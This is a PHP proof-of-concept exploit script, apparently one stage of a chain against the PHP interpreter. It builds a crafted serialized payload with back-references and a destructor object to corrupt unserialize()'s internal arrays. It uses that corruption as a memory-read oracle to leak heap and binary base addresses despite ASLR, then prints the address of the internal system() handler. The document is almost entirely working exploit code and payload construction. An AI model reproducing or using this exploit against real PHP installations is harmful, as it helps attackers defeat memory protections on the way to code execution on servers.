<?php
// vb2_base.php — M2: BINARY BASE in-process (victim-snapshot oracle, no gdb).
//
// All in the LIVE dance array (which leaks +1 and never frees — irrelevant):
//  - Dance (a:127, arData reclaims block2): elem0 = i:5 key 129 (slot 129);
//    elem1 = R:1 key 256 (slot 0); elems 2..61 = i:1 fresh slots (pushes
//    data[m-1] = &bucket[m].val); elems 62..125 = R:1 slot-0 chains;
//    elem126 = i:1 key 16896 (its push writes data[126] = bucket[0].val.value
//    = &bucket[126].val = block2+5056 => $blk = unserialize(D::$dp)[129]).
//  - u-calls (a:0:{}): pushes at data[127...]; the 8th (u9) push lands on
//    data[134] = bucket[2].val.value => victim bucket[2] = {&rval_u9, type}.
//    u-call result temps are consecutive 16B slots; each holds
//    {&zend_empty_array, IS_ARRAY} after the call (measured).
//  - elem2 = a STRING (s:8) => victim type = IS_STRING(6).
//  - SNAPSHOT: R:1020 -> var_access(1019) -> id1 -> data[1] = &bucket[2].val
//    -> the R-rule wraps the victim zval into a fresh zend_reference
//    (snapshot!) => $r = ref{&rval_u9, IS_STRING}.
//  - Then u10 runs (a:0:{}): its temp = rval_u9+16 gets {&zend_empty_array}.
//    (Its push corrupts bucket[2].val.u1u2 — AFTER the snapshot, harmless.)
//  - strlen($r) derefs the ref's snapshot => string at &rval_u9 =>
//    len = *(rval_u9+16) = &zend_empty_array = BASE + 0xffe460.
//
// usage: php -n vb2_base.php     (run DIRECTLY; ASLR on; no gdb)

class D { public static string $dp = ''; }

class Stage1 {
    public function __destruct() {
        $blk = unserialize(D::$dp)[129];
        if ($blk === 5) { echo "DANCE-MISS\n"; return; }
        $block2 = $blk - 5056;
        // u-calls: pushes data[127..134]; u9's push = bucket[2].val.value
        $u2 = unserialize('a:0:{}');
        $u3 = unserialize('a:0:{}');
        $u4 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $u6 = unserialize('a:0:{}');
        $u7 = unserialize('a:0:{}');
        $u8 = unserialize('a:0:{}');
        $u9 = unserialize('a:0:{}');
        // SNAPSHOT the victim bucket[2] = {&rval_u9, IS_STRING} into a ref
        $r = unserialize('R:1020;');
        // u10: temp = rval_u9+16 := {&zend_empty_array, IS_ARRAY}
        $u10 = unserialize('a:0:{}');
        // deref now: strlen = *(rval_u9+16) = &zend_empty_array
        $empty = strlen($r);
        echo "M1-HEAP block2 = 0x", dechex($block2), "\n";
        echo "M2-ORACLE *(rval_u9+16) = 0x", dechex($empty), "\n";
        if ($empty < 0x10000) { echo "M2-BAIL: oracle read failed\n"; return; }
        $base = $empty - 0xffe460;
        echo "M2-BASE = 0x", dechex($base), "  lo12=", dechex($base & 0xfff), " (want 0)\n";
        if (($base & 0xfff) !== 0) { echo "M2-BAIL: base misaligned\n"; return; }
        echo "M2-DONE base=0x", dechex($base),
             "  zif_system=0x", dechex($base + 0x523c60), "\n";
    }
}

$d = 'i:129;i:5;';                                      // elem0: INT victim, slot 129
$d .= 'i:256;R:1;';                                     // elem1: slot 0, no push
$d .= 'i:8;s:8:"AAAAAAAA";';                            // elem2: STRING victim (type 6)
for ($m = 3; $m <= 61; $m++) { $d .= 'i:' . (2*$m+4) . ';i:1;'; }   // fresh slots
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256*$j) . ';R:1;'; }   // slot-0 chains
$d .= 'i:16896;i:1;';                                   // elem126: the block2 push
D::$dp = 'a:127:{' . $d . '}';

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:6:"Stage1":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer ok=", var_export($r !== false, true), "\n";
echo "SURVIVED\n";
